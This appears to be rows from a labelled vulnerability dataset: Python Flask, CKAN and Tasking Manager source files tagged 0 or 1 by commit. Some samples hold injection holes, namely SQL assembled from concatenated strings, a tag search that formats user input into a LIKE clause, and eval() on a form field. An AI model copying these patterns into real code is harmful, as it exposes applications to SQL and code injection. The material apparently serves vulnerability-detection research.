      language_consultant = db.Column(db.Integer, db.ForeignKey('account.id'), nullable=True)
      lenght_in_chars = db.Column(db.Integer, nullable=True)
      language_consultation_status = db.Column(db.Integer, nullable=False)
      language_consultation_status_text = db.Column(db.String(144), nullable=True)
      layout_artist = db.Column(db.Integer, db.ForeignKey('account.id'), nullable=True)
      layout_status = db.Column(db.Integer, nullable=False)
      layout_status_text = db.Column(db.String(144), nullable=True)
      ready = db.Column(db.Boolean, nullable=False)

      created_by = db.Column(db.Integer, db.ForeignKey('account.id'), nullable=False)
      synopsis = db.Column(db.Integer, db.ForeignKey('synopsis.id'), nullable=True)


      def __init__(self, name, created_by):
            self.name = name
            self.ready = False
            self.editing_status = 0
            self.writing_status = 0
            self.language_consultation_status = 0
            self.layout_status = 0
            self.created_by = created_by

      def set_writer(self, writer_id):
            if writer_id == 0:
                  self.writer = None
            else:
                  self.writer = writer_id


      def set_editor(self, editor_id):
            if editor_id == 0:
                  self.editor_in_charge = None
            else:
                  self.editor_in_charge = editor_id

      def set_issue(self, issue_id):
            if issue_id == 0:
                  self.issue = None
            else:
                  self.issue = issue_id

      def set_name(self, name):
            self.name = name


      @staticmethod
      def get_all_articles():
            return getArticlesWithCondition(""0=0"")

      @staticmethod
      def get_all_planned_articles(issue=0):
            issuecondition = get_issue_condition(issue)
            condition = ""Article.writing_status = 0"" + issuecondition
            return getArticlesWithCondition(condition)

      @staticmethod
      def get_all_draft_articles(issue=0):
            issuecondition = get_issue_condition(issue)
            condition = ""Article.writing_status > 0 AND"" + \
                  "" Article.writing_status < 100"" + issuecondition
            return getArticlesWithCondition(condition)

      @staticmethod
      def get_all_written_articles(issue=0):
            issuecondition = get_issue_condition(issue)
            condition = ""Article.writing_status = 100 AND"" + \
                  "" Article.editing_status < 100"" + issuecondition
            return getArticlesWithCondition(condition)

      @staticmethod
      def get_all_edited_articles(issue=0):
            issuecondition = get_issue_condition(issue)
            condition = ""article.editing_status = 100 AND"" + \
                  "" Article.ready = %s"" % (""false"" if os.environ.get(""HEROKU"") else ""0"") + \
                  issuecondition
            return getArticlesWithCondition(condition)

      @staticmethod
      def get_all_finished_articles(issue=0):
            issuecondition = get_issue_condition(issue)
            condition = ""Article.ready = %s"" % (""true"" if os.environ.get(""HEROKU"") else ""1"") + \
                  issuecondition
            return getArticlesWithCondition(condition)

class Synopsis(Base):
      article_id = db.Column(db.Integer, db.ForeignKey('article.id'), nullable=False)
      content = db.Column(db.String(288), nullable=True)

      def __init__(self, article_id, content):
            self.article_id = article_id
            self.content = content

      def set_content(self, content):
            self.content = content

def get_issue_condition(issue):
      issuecondition = """"
      if issue != 0 and isinstance(issue, int):
            issue = str(issue)
            issuecondition = "" AND Article.issue = "" + issue
      return issuecondition
/n/n/napplication/help.py/n/nfrom application import db, os
from sqlalchemy.sql import text

def format_as_pair_id_name(options):
    formatted = [(0, None)]
    for item in options:
        formatted.append((item.id, item.name))
    return formatted

def getPeopleOptions():
    query = text(
        ""SELECT Account.name AS name, Account.id AS id FROM Account""
        "" GROUP BY Account.name, Account.id""
        "" ORDER BY Account.name""
    )
    return format_as_pair_id_name(db.engine.execute(query))

def getEditorOptions():
    query = text(
        ""SELECT Account.name AS name, Account.id AS id FROM Account""
        "" WHERE Account.editor = %s"" % (""true"" if os.environ.get(""HEROKU"") else ""1"") + \
        "" GROUP BY Account.name, Account.id""
        "" ORDER BY Account.name""
    )
    return format_as_pair_id_name(db.engine.execute(query))

def getIssueOptions():
    query = text(
        ""SELECT id, name FROM Issue ORDER BY name""
    )
    return format_as_pair_id_name(db.engine.execute(query))

# DANGER DANGER, never call this without verifying that condition is not shady
def getArticlesWithCondition(condition=""(0 = 0)""):
    return getArticlesAmountCondition(condition=condition)

# Returns an array of [amount] articles where the condition [condition]
#  is satisfied.
# DANGER DANGER, never call this without verifying that condition is not shady
def getArticlesAmountCondition(amount=0, condition=""(0=0)""):
    howmany = """"
    order = """"
    if amount > 0:
        howmany = "" LIMIT %d"" % int(amount)
    if amount != 1:
        order = "" ORDER BY Issue.name""
    query = text(
        ""SELECT""
        "" Article.id AS id,""
        "" Issue.name AS issue,""
        "" Article.writing_status AS writing_status,""
        "" Article.editing_status AS editing_status,""
        "" Article.ready AS ready,""
        "" Article.name AS name,""
        "" Article.writer AS writer_id,""
        "" Article.editor_in_charge AS editor_id,""
        "" Writer.name AS writer,""
        "" Editor.name AS editor_in_charge""
        "" FROM Article""
        "" LEFT JOIN Account Writer ON Article.writer = Writer.id""
        "" LEFT JOIN Account Editor ON Article.editor_in_charge = Editor.id""
        "" LEFT JOIN Issue ON Article.issue = Issue.id""
        "" WHERE %s"" % condition +\
        "" GROUP BY Article.id, Article.ready, Article.name, Issue.name, Writer.name, Editor.name"" + \
        howmany + order
    )
    return db.engine.execute(query)

def getArticleWithId(id):
    if not isinstance(id, int):
        return None

    resultArray = getArticlesAmountCondition(amount=1, condition=""Article.id = %d"" % id)
    try:
        return resultArray.first()
    except:
        return None
        /n/n/napplication/issues/views.py/n/nfrom flask import render_template, request, redirect, url_for
from flask_login import login_user, login_required, logout_user, current_user

from application import app, db
from application.articles.models import Article
from application.articles.forms import ArticleForm
from application.help import getEditorOptions, getIssueOptions, getPeopleOptions
from application.issues.models import Issue
from application.issues.forms import IssueForm

from sqlalchemy.sql import text

@app.route(""/issues/"", methods=[""GET""])
def issues_index():
    query = text(
        ""SELECT issue.id, issue.name FROM issue ORDER BY issue.name""
    )
    issues = db.engine.execute(query)
    return render_template(""/issues/list.html"", current_user=current_user, issues = issues)

@app.route(""/<issue>/articles/"", methods=[""GET""])
def articles_in_issue(issue):
    try:
        issueid = Issue.query.filter_by(name=issue).first().id
    except:
        return redirect(url_for(""error404""))

    return render_template(""articles/editor_view.html"", 
        planned_articles = Article.get_all_planned_articles(int(issueid)),
        draft_articles = Article.get_all_draft_articles(int(issueid)),
        written_articles = Article.get_all_written_articles(int(issueid)),
        edited_articles = Article.get_all_edited_articles(int(issueid)),
        finished_articles = Article.get_all_finished_articles(int(issueid)))

@app.route(""/<issue>/articles/new"", methods=[""GET""])
@login_required
def articles_create_for_issue(issue):
    try:
        issueid = Issue.query.filter_by(name=issue).first().id
    except:
        return redirect(url_for(""error404""))
    
    if not current_user.editor:
        return redirect(url_for(""error403""))

    form = ArticleForm()
    form.writer.choices = getPeopleOptions()
    form.editorInCharge.choices = getEditorOptions()
    form.issue.choices = getIssueOptions()
    form.issue.data = issueid

    return render_template(""/articles/new.html"", form=form)

@app.route(""/issues/new/"", methods=[""GET"", ""POST""])
@login_required
def issues_create():
    if request.method == ""GET"":
        form = IssueForm()
        return render_template(""/issues/new.html"", form=form)
    
    if not current_user.editor:
        return redirect(url_for(""error401""))

    form = IssueForm(request.form)

    if not form.validate():
        return render_template(""issues/new.html"", form = form)
    
    issue = Issue(form.name.data)
    db.session.add(issue)
    db.session.commit()

    return redirect(url_for(""issues_index""))

@app.route(""/<issue_id>/delete"", methods=[""POST""])
@login_required
def issues_delete(issue_id):
    if not current_user.is_admin:
        return redirect(url_for(""error401""))

    issue_to_delete = Issue.query.get(issue_id)
    if not issue_to_delete:
        return redirect(url_for(""error404""))

    articles_in_issue = Article.query.filter_by(issue=issue_id)

    # related articles are not distroyed but unassigned
    for article in articles_in_issue:
        article.set_issue(0)

    db.session.delete(issue_to_delete)
    db.session.commit()

    return redirect(url_for(""issues_index""))

/n/n/napplication/people/views.py/n/nfrom flask import redirect, render_template, request, url_for
from flask_login import login_required, current_user

from application import app, db
from application.auth.models import User
from application.people.models import Name
from application.people.forms import NameForm

@app.route(""/people/"", methods=[""GET""])
def people_index():
    return render_template(""/people/list.html"", people = get_people())

@app.route(""/people/new/"")
@login_required
def people_form():
    if not current_user.editor:
        return redirect(url_for(""error403""))

    form = NameForm()
    return render_template(""/people/new.html"", form = form)

@app.route(""/people/"", methods=[""POST""])
@login_required
def people_create():
    if not current_user.editor:
        return redirect(url_for(""error403""))

    form = NameForm(request.form)

    if not form.validate():
        return render_template(""people/new.html"", form = form)

    u = User(form.name.data, """", """")
    db.session().add(u)
    db.session().commit()
    u.add_name(form.name.data)

    return redirect(url_for(""people_index""))

@app.route(""/people/<user_id>/edit"", methods=[""GET""])
@login_required
def person_edit(user_id):
    form = NameForm()
    name = """"
    username = """"
    prsn = User.query.filter_by(id = user_id).first()

    if prsn.username != """":
        username = prsn.username

    name = prsn.name

    names = list(map(lambda name: {""name"":name.name, ""id"":name.id}, prsn.names))
    person = {""id"": user_id, ""name"": name, ""username"": username, ""names"": names}

    return render_template(""/people/edit.html"", person = person, form = form)

@app.route(""/people/<user_id>/delete_name/<name_id>"", methods=[""POST""])
@login_required
def delete_name(name_id, user_id):
    if not current_user.editor:
        return redirect(url_for(""error403""))

    name_to_delete = Name.query.filter_by(id = name_id).first()
    db.session.delete(name_to_delete)
    db.session.commit()
    return redirect(url_for(""person_edit"", user_id=user_id))

@app.route(""/people/<user_id>"", methods=[""POST""])
@login_required
def names_create(user_id):
    if not current_user.editor:
        return redirect(url_for(""error403""))

    form = NameForm(request.form)

    if not form.validate():
        return render_template(""/people/edit.html"", person=eval(request.form[""person""]), form = form)

    n = Name(form.name.data, user_id)

    db.session().add(n)
    db.session().commit()

    return redirect(url_for(""person_edit"", user_id=user_id))

@app.route(""/people/<user_id>/"", methods=[""GET""])
def show_tasks(user_id):
    user = User.query.get(int(user_id))
    if not user:
        return redirect(url_for(""error404""))
    
    name = user.name

    articles_writing = user.get_articles_writing().fetchall()
    articles_editing = user.get_articles_editing().fetchall()

    return render_template(""people/tasks.html"",
        articles_writing = articles_writing,
        articles_editing = articles_editing,
        posessive_form = """" + name + ""'s"",
        system_name = user.name,
        person_is = name + "" is"")

def get_people():
    people = []
    ppl = User.query.all()
    for person in ppl:
        username = """"
        name = person.name
        if person.username:
            username = person.username
        names = Name.query.filter_by(user_id=person.id)
        people.append({'id': person.id, 'username': username, 'name': name, 'names': names})
    return people/n/n/n",0
119,119,3b85c99a373267bb85b1c9d88aab3f0c38494606,"/application/issues/views.py/n/nfrom flask import render_template, request, redirect, url_for
from flask_login import login_user, login_required, logout_user, current_user

from application import app, db
from application.help import getArticlesWithCondition
from application.articles.models import Article
from application.articles.forms import ArticleForm
from application.help import getEditorOptions, getIssueOptions, getPeopleOptions
from application.issues.models import Issue
from application.issues.forms import IssueForm

from sqlalchemy.sql import text

@app.route(""/issues/"", methods=[""GET""])
def issues_index():
    query = text(
        ""SELECT issue.id, issue.name FROM issue ORDER BY issue.name""
    )
    issues = db.engine.execute(query)
    return render_template(""/issues/list.html"", current_user=current_user, issues = issues)

@app.route(""/<issue>/articles/"", methods=[""GET""])
def articles_in_issue(issue):
    try:
        issueid = Issue.query.filter_by(name=issue).first().id
    except:
        return redirect(url_for(""error404""))

    return render_template(""articles/editor_view.html"", 
        planned_articles = Article.get_all_planned_articles(int(issueid)),
        draft_articles = Article.get_all_draft_articles(int(issueid)),
        written_articles = Article.get_all_written_articles(int(issueid)),
        edited_articles = Article.get_all_edited_articles(int(issueid)),
        finished_articles = Article.get_all_finished_articles(int(issueid)))

@app.route(""/<issue>/articles/new"", methods=[""GET""])
@login_required
def articles_create_for_issue(issue):
    try:
        issueid = Issue.query.filter_by(name=issue).first().id
    except:
        return redirect(url_for(""error404""))
    
    if not current_user.editor:
        return redirect(url_for(""error403""))

    form = ArticleForm()
    form.writer.choices = getPeopleOptions()
    form.editorInCharge.choices = getEditorOptions()
    form.issue.choices = getIssueOptions()
    form.issue.data = issueid

    return render_template(""/articles/new.html"", form=form)

@app.route(""/issues/new/"", methods=[""GET"", ""POST""])
@login_required
def issues_create():
    if request.method == ""GET"":
        form = IssueForm()
        return render_template(""/issues/new.html"", form=form)
    
    if not current_user.editor:
        return redirect(url_for(""error401""))

    form = IssueForm(request.form)

    if not form.validate():
        return render_template(""issues/new.html"", form = form)
    
    issue = Issue(form.name.data)
    db.session.add(issue)
    db.session.commit()

    return redirect(url_for(""issues_index""))

@app.route(""/<issue_id>/delete"", methods=[""POST""])
@login_required
def issues_delete(issue_id):
    if not current_user.is_admin:
        return redirect(url_for(""error401""))

    issue_to_delete = Issue.query.get(issue_id)
    if not issue_to_delete:
        return redirect(url_for(""error404""))

    articles_in_issue = Article.query.filter_by(issue=issue_id)

    # related articles are not distroyed but unassigned
    for article in articles_in_issue:
        article.set_issue(0)

    db.session.delete(issue_to_delete)
    db.session.commit()

    return redirect(url_for(""issues_index""))

/n/n/n/application/people/views.py/n/nfrom flask import redirect, render_template, request, url_for
from flask_login import login_required, current_user

from application import app, db
from application.auth.models import User
from application.people.models import Name
from application.people.forms import NameForm

@app.route(""/people/"", methods=[""GET""])
def people_index():
    return render_template(""/people/list.html"", people = get_people())

@app.route(""/people/new/"")
@login_required
def people_form():
    if not current_user.editor:
        return redirect(url_for(""error403""))

    form = NameForm()
    return render_template(""/people/new.html"", form = form)

@app.route(""/people/"", methods=[""POST""])
@login_required
def people_create():
    if not current_user.editor:
        return redirect(url_for(""error403""))

    form = NameForm(request.form)

    if not form.validate():
        return render_template(""people/new.html"", form = form)

    u = User(form.name.data, """", """")
    db.session().add(u)
    db.session().commit()
    u.add_name(form.name.data)

    return redirect(url_for(""people_index""))

@app.route(""/people/<user_id>/edit"", methods=[""GET""])
@login_required
def person_edit(user_id):
    form = NameForm()
    name = """"
    username = """"
    prsn = User.query.filter_by(id = user_id).first()

    if prsn.username != """":
        username = prsn.username

    name = prsn.name

    names = list(map(lambda name: {""name"":name.name, ""id"":name.id}, prsn.names))
    person = {""id"": user_id, ""name"": name, ""username"": username, ""names"": names}

    return render_template(""/people/edit.html"", person = person, form = form)

@app.route(""/people/<user_id>/delete_name/<name_id>"", methods=[""POST""])
@login_required
def delete_name(name_id, user_id):
    if not current_user.editor:
        return redirect(url_for(""error403""))

    name_to_delete = Name.query.filter_by(id = name_id).first()
    db.session.delete(name_to_delete)
    db.session.commit()
    return redirect(url_for(""person_edit"", user_id=user_id))

@app.route(""/people/<user_id>"", methods=[""POST""])
@login_required
def names_create(user_id):
    if not current_user.editor:
        return redirect(url_for(""error403""))

    form = NameForm(request.form)

    if not form.validate():
        return render_template(""/people/edit.html"", person=eval(request.form[""person""]), form = form)

    n = Name(form.name.data, user_id)

    db.session().add(n)
    db.session().commit()

    return redirect(url_for(""person_edit"", user_id=user_id))

@app.route(""/people/<user_id>/"", methods=[""GET""])
def show_tasks(user_id):
    user = User.query.get(int(user_id))
    if not user:
        return redirect(url_for(""error404""))
    
    name = user.name

    articles_writing = user.get_articles_writing()
    articles_editing = user.get_articles_editing()

    return render_template(""people/tasks.html"",
        articles_writing = articles_writing,
        articles_editing = articles_editing,
        posessive_form = """" + name + ""'s"",
        system_name = user.name,
        person_is = name + "" is"")

def get_people():
    people = []
    ppl = User.query.all()
    for person in ppl:
        username = """"
        name = person.name
        if person.username:
            username = person.username
        names = Name.query.filter_by(user_id=person.id)
        people.append({'id': person.id, 'username': username, 'name': name, 'names': names})
    return people/n/n/n",1
10,10,f020853c54a1851f196d7fd8897c4620bccf9f6c,"ckan/models/package.py/n/nimport sqlobject

try:
    # vdm >= 0.2
    import vdm.sqlobject.base as vdmbase
    from vdm.sqlobject.base import State
except:
    # vdm == 0.1
    import vdm.base as vdmbase
    from vdm.base import State

# American spelling ...
class License(sqlobject.SQLObject):

    class sqlmeta:
        _defaultOrder = 'name'

    name = sqlobject.UnicodeCol(alternateID=True)
    packages = sqlobject.MultipleJoin('Package')


class PackageRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Package', cascade=True)
    title = sqlobject.UnicodeCol(default=None)
    url = sqlobject.UnicodeCol(default=None)
    download_url = sqlobject.UnicodeCol(default=None)
    license = sqlobject.ForeignKey('License', default=None)
    notes = sqlobject.UnicodeCol(default=None)


class TagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Tag', cascade=True)


class PackageTagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('PackageTag', cascade=True)


class Package(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    
    name = sqlobject.UnicodeCol(alternateID=True)

    # should be attribute_name, module_name, module_object
    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]

    def add_tag_by_name(self, tagname):
        try:
            tag = self.revision.model.tags.get(tagname)
        except: # TODO: make this specific
            tag = self.transaction.model.tags.create(name=tagname)
        self.tags.create(tag=tag)


class Tag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = TagRevision

    name = sqlobject.UnicodeCol(alternateID=True)
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)

    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]

    @classmethod
    def search_by_name(self, text_query):
        text_query = str(text_query) # SQLObject chokes on unicode.
        return self.select(self.q.name.contains(text_query.lower()))


class PackageTag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageTagRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    m2m = []

    package = sqlobject.ForeignKey('Package', cascade=True)
    tag = sqlobject.ForeignKey('Tag', cascade=True)

    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',
            unique=True)

/n/n/n",0
11,11,f020853c54a1851f196d7fd8897c4620bccf9f6c,"/ckan/models/package.py/n/nimport sqlobject

try:
    # vdm >= 0.2
    import vdm.sqlobject.base as vdmbase
    from vdm.sqlobject.base import State
except:
    # vdm == 0.1
    import vdm.base as vdmbase
    from vdm.base import State

# American spelling ...
class License(sqlobject.SQLObject):

    class sqlmeta:
        _defaultOrder = 'name'

    name = sqlobject.UnicodeCol(alternateID=True)
    packages = sqlobject.MultipleJoin('Package')


class PackageRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Package', cascade=True)
    title = sqlobject.UnicodeCol(default=None)
    url = sqlobject.UnicodeCol(default=None)
    download_url = sqlobject.UnicodeCol(default=None)
    license = sqlobject.ForeignKey('License', default=None)
    notes = sqlobject.UnicodeCol(default=None)


class TagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('Tag', cascade=True)


class PackageTagRevision(vdmbase.ObjectRevisionSQLObject):

    base = sqlobject.ForeignKey('PackageTag', cascade=True)


class Package(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    
    name = sqlobject.UnicodeCol(alternateID=True)

    # should be attribute_name, module_name, module_object
    m2m = [ ('tags', 'ckan.models.package', 'Tag', 'PackageTag') ]

    def add_tag_by_name(self, tagname):
        try:
            tag = self.revision.model.tags.get(tagname)
        except: # TODO: make this specific
            tag = self.transaction.model.tags.create(name=tagname)
        self.tags.create(tag=tag)


class Tag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = TagRevision

    name = sqlobject.UnicodeCol(alternateID=True)
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)

    m2m = [ ('packages', 'ckan.models.package', 'Package', 'PackageTag') ]

    @classmethod
    def search_by_name(self, text_query):
        text_query_str = str(text_query) # SQLObject chokes on unicode.
        # Todo: Change to use SQLObject statement objects.
        sql_query = ""UPPER(tag.name) LIKE UPPER('%%%s%%')"" % text_query_str
        return self.select(sql_query)


class PackageTag(vdmbase.VersionedDomainObject):

    sqlobj_version_class = PackageTagRevision
    versioned_attributes = vdmbase.get_attribute_names(sqlobj_version_class)
    m2m = []

    package = sqlobject.ForeignKey('Package', cascade=True)
    tag = sqlobject.ForeignKey('Tag', cascade=True)

    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',
            unique=True)

/n/n/n",1
0,0,dee040a2d22b3c4d5e38e2dbf8c6b651ad4c241a,"server/models/postgis/message.py/n/nfrom sqlalchemy import text

from server import db
from flask import current_app
from enum import Enum
from server.models.dtos.message_dto import MessageDTO, MessagesDTO
from server.models.postgis.user import User
from server.models.postgis.task import Task
from server.models.postgis.project import Project
from server.models.postgis.utils import timestamp
from server.models.postgis.utils import NotFound

class MessageType(Enum):
    """""" Describes the various kinds of messages a user might receive """"""
    SYSTEM = 1                     # Generic system-generated message
    BROADCAST = 2                  # Broadcast message from a project manager
    MENTION_NOTIFICATION = 3       # Notification that user was mentioned in a comment/chat
    VALIDATION_NOTIFICATION = 4    # Notification that user's mapped task was validated
    INVALIDATION_NOTIFICATION = 5  # Notification that user's mapped task was invalidated

class Message(db.Model):
    """""" Describes an individual Message a user can send """"""
    __tablename__ = ""messages""

    __table_args__ = (
        db.ForeignKeyConstraint(['task_id', 'project_id'], ['tasks.id', 'tasks.project_id']),
    )

    id = db.Column(db.Integer, primary_key=True)
    message = db.Column(db.String)
    subject = db.Column(db.String)
    from_user_id = db.Column(db.BigInteger, db.ForeignKey('users.id'))
    to_user_id = db.Column(db.BigInteger, db.ForeignKey('users.id'), index=True)
    project_id = db.Column(db.Integer, db.ForeignKey('projects.id'), index=True)
    task_id = db.Column(db.Integer, index=True)
    message_type = db.Column(db.Integer, index=True)
    date = db.Column(db.DateTime, default=timestamp)
    read = db.Column(db.Boolean, default=False)

    # Relationships
    from_user = db.relationship(User, foreign_keys=[from_user_id])
    to_user = db.relationship(User, foreign_keys=[to_user_id], backref='messages')
    project = db.relationship(Project, foreign_keys=[project_id], backref='messages')
    task = db.relationship(Task, primaryjoin=""and_(Task.id == foreign(Message.task_id), Task.project_id == Message.project_id)"",
        backref='messages')

    @classmethod
    def from_dto(cls, to_user_id: int, dto: MessageDTO):
        """""" Creates new message from DTO """"""
        message = cls()
        message.subject = dto.subject
        message.message = dto.message
        message.from_user_id = dto.from_user_id
        message.to_user_id = to_user_id
        message.project_id = dto.project_id
        message.task_id = dto.task_id
        if dto.message_type is not None:
            message.message_type = MessageType(dto.message_type)

        return message

    def as_dto(self) -> MessageDTO:
        """""" Casts message object to DTO """"""
        dto = MessageDTO()
        dto.message_id = self.id
        dto.message = self.message
        dto.sent_date = self.date
        dto.read = self.read
        dto.subject = self.subject
        dto.project_id = self.project_id
        dto.task_id = self.task_id
        if self.message_type is not None:
            dto.message_type = MessageType(self.message_type).name

        if self.from_user_id:
            dto.from_username = self.from_user.username

        return dto

    def add_message(self):
        """""" Add message into current transaction - DO NOT COMMIT HERE AS MESSAGES ARE PART OF LARGER TRANSACTIONS""""""
        current_app.logger.debug('Adding message to session')
        db.session.add(self)

    def save(self):
        """""" Save """"""
        db.session.add(self)
        db.session.commit()

    @staticmethod
    def get_all_contributors(project_id: int):
        """""" Get all contributors to a project """"""
        query = '''SELECT mapped_by as contributors from tasks where project_id = :project_id and mapped_by is not null
                   UNION
                   SELECT validated_by from tasks where tasks.project_id = :project_id and validated_by is not null'''

        contributors = db.engine.execute(text(query), project_id=project_id)
        return contributors

    def mark_as_read(self):
        """""" Mark the message in scope as Read """"""
        self.read = True
        db.session.commit()

    @staticmethod
    def get_unread_message_count(user_id: int):
        """""" Get count of unread messages for user """"""
        return Message.query.filter(Message.to_user_id == user_id, Message.read == False).count()

    @staticmethod
    def get_all_messages(user_id: int) -> MessagesDTO:
        """""" Gets all messages to the user """"""
        user_messages = Message.query.filter(Message.to_user_id == user_id).all()

        if len(user_messages) == 0:
            raise NotFound()

        messages_dto = MessagesDTO()
        for message in user_messages:
            messages_dto.user_messages.append(message.as_dto())

        return messages_dto

    @staticmethod
    def delete_multiple_messages(message_ids: list, user_id: int):
        """""" Deletes the specified messages to the user """"""
        Message.query.filter(Message.to_user_id == user_id, Message.id.in_(message_ids)).\
                delete(synchronize_session=False)
        db.session.commit()

    def delete(self):
        """""" Deletes the current model from the DB """"""
        db.session.delete(self)
        db.session.commit()
/n/n/nserver/models/postgis/project.py/n/nimport json
import re
from typing import Optional
from cachetools import TTLCache, cached

import geojson
from flask import current_app
from geoalchemy2 import Geometry
from sqlalchemy import text
from shapely.geometry import shape
from sqlalchemy.dialects.postgresql import ARRAY
from sqlalchemy.orm.session import make_transient
from geoalchemy2.shape import to_shape
from shapely.geometry import Polygon
from shapely.ops import transform
from functools import partial
import pyproj
import dateutil.parser
import datetime

from server import db
from server.models.dtos.project_dto import ProjectDTO, DraftProjectDTO, ProjectSummary, PMDashboardDTO, ProjectStatsDTO, ProjectUserStatsDTO
from server.models.dtos.tags_dto import TagsDTO
from server.models.postgis.priority_area import PriorityArea, project_priority_areas
from server.models.postgis.project_info import ProjectInfo
from server.models.postgis.project_chat import ProjectChat
from server.models.postgis.statuses import ProjectStatus, ProjectPriority, MappingLevel, TaskStatus, MappingTypes, TaskCreationMode, Editors
from server.models.postgis.tags import Tags
from server.models.postgis.task import Task, TaskHistory
from server.models.postgis.user import User

from server.models.postgis.utils import ST_SetSRID, ST_GeomFromGeoJSON, timestamp, ST_Centroid, NotFound, ST_Area, ST_Transform
from server.services.grid.grid_service import GridService

# Secondary table defining many-to-many join for private projects that only defined users can map on
project_allowed_users = db.Table(
    'project_allowed_users',
    db.metadata,
    db.Column('project_id', db.Integer, db.ForeignKey('projects.id')),
    db.Column('user_id', db.BigInteger, db.ForeignKey('users.id'))
)

# cache mapper counts for 30 seconds
active_mappers_cache = TTLCache(maxsize=1024, ttl=30)


class Project(db.Model):
    """""" Describes a HOT Mapping Project """"""
    __tablename__ = 'projects'

    # Columns
    id = db.Column(db.Integer, primary_key=True)
    status = db.Column(db.Integer, default=ProjectStatus.DRAFT.value, nullable=False)
    created = db.Column(db.DateTime, default=timestamp, nullable=False)
    priority = db.Column(db.Integer, default=ProjectPriority.MEDIUM.value)
    default_locale = db.Column(db.String(10),
                               default='en')  # The locale that is returned if requested locale not available
    author_id = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_users'), nullable=False)
    mapper_level = db.Column(db.Integer, default=1, nullable=False, index=True)  # Mapper level project is suitable for
    enforce_mapper_level = db.Column(db.Boolean, default=False)
    enforce_validator_role = db.Column(db.Boolean, default=False)  # Means only users with validator role can validate
    enforce_random_task_selection = db.Column(db.Boolean, default=False)  # Force users to edit at random to avoid mapping ""easy"" tasks
    allow_non_beginners = db.Column(db.Boolean, default=False)
    private = db.Column(db.Boolean, default=False)  # Only allowed users can validate
    entities_to_map = db.Column(db.String)
    changeset_comment = db.Column(db.String)
    osmcha_filter_id = db.Column(db.String)  # Optional custom filter id for filtering on OSMCha
    due_date = db.Column(db.DateTime)
    imagery = db.Column(db.String)
    josm_preset = db.Column(db.String)
    last_updated = db.Column(db.DateTime, default=timestamp)
    license_id = db.Column(db.Integer, db.ForeignKey('licenses.id', name='fk_licenses'))
    geometry = db.Column(Geometry('MULTIPOLYGON', srid=4326))
    centroid = db.Column(Geometry('POINT', srid=4326))
    task_creation_mode = db.Column(db.Integer, default=TaskCreationMode.GRID.value, nullable=False)

    # Tags
    mapping_types = db.Column(ARRAY(db.Integer), index=True)
    organisation_tag = db.Column(db.String, index=True)
    campaign_tag = db.Column(db.String, index=True)

    # Editors
    mapping_editors = db.Column(ARRAY(db.Integer), default=[
                                                            Editors.ID.value,
                                                            Editors.JOSM.value,
                                                            Editors.POTLATCH_2.value,
                                                            Editors.FIELD_PAPERS.value],
                                                            index=True, nullable=False)
    validation_editors = db.Column(ARRAY(db.Integer), default=[
                                                               Editors.ID.value,
                                                               Editors.JOSM.value,
                                                               Editors.POTLATCH_2.value,
                                                               Editors.FIELD_PAPERS.value],
                                                               index=True, nullable=False)

    # Stats
    total_tasks = db.Column(db.Integer, nullable=False)
    tasks_mapped = db.Column(db.Integer, default=0, nullable=False)
    tasks_validated = db.Column(db.Integer, default=0, nullable=False)
    tasks_bad_imagery = db.Column(db.Integer, default=0, nullable=False)

    # Mapped Objects
    tasks = db.relationship(Task, backref='projects', cascade=""all, delete, delete-orphan"", lazy='dynamic')
    project_info = db.relationship(ProjectInfo, lazy='dynamic', cascade='all')
    project_chat = db.relationship(ProjectChat, lazy='dynamic', cascade='all')
    author = db.relationship(User)
    allowed_users = db.relationship(User, secondary=project_allowed_users)
    priority_areas = db.relationship(PriorityArea, secondary=project_priority_areas, cascade=""all, delete-orphan"",
                                     single_parent=True)

    def create_draft_project(self, draft_project_dto: DraftProjectDTO):
        """"""
        Creates a draft project
        :param draft_project_dto: DTO containing draft project details
        :param aoi: Area of Interest for the project (eg boundary of project)
        """"""
        self.project_info.append(ProjectInfo.create_from_name(draft_project_dto.project_name))
        self.status = ProjectStatus.DRAFT.value
        self.author_id = draft_project_dto.user_id
        self.last_updated = timestamp()

    def set_project_aoi(self, draft_project_dto: DraftProjectDTO):
        """""" Sets the AOI for the supplied project """"""
        aoi_geojson = geojson.loads(json.dumps(draft_project_dto.area_of_interest))

        aoi_geometry = GridService.merge_to_multi_polygon(aoi_geojson, dissolve=True)

        valid_geojson = geojson.dumps(aoi_geometry)
        self.geometry = ST_SetSRID(ST_GeomFromGeoJSON(valid_geojson), 4326)
        self.centroid = ST_Centroid(self.geometry)

    def set_default_changeset_comment(self):
        """""" Sets the default changeset comment""""""
        default_comment = current_app.config['DEFAULT_CHANGESET_COMMENT']
        self.changeset_comment = f'{default_comment}-{self.id} {self.changeset_comment}' if self.changeset_comment is not None else f'{default_comment}-{self.id}'
        self.save()

    def create(self):
        """""" Creates and saves the current model to the DB """"""
        db.session.add(self)
        db.session.commit()

    def save(self):
        """""" Save changes to db""""""
        db.session.commit()

    @staticmethod
    def clone(project_id: int, author_id: int):
        """""" Clone project """"""

        cloned_project = Project.get(project_id)

        # Remove clone from session so we can reinsert it as a new object
        db.session.expunge(cloned_project)
        make_transient(cloned_project)

        # Re-initialise counters and meta-data
        cloned_project.total_tasks = 0
        cloned_project.tasks_mapped = 0
        cloned_project.tasks_validated = 0
        cloned_project.tasks_bad_imagery = 0
        cloned_project.last_updated = timestamp()
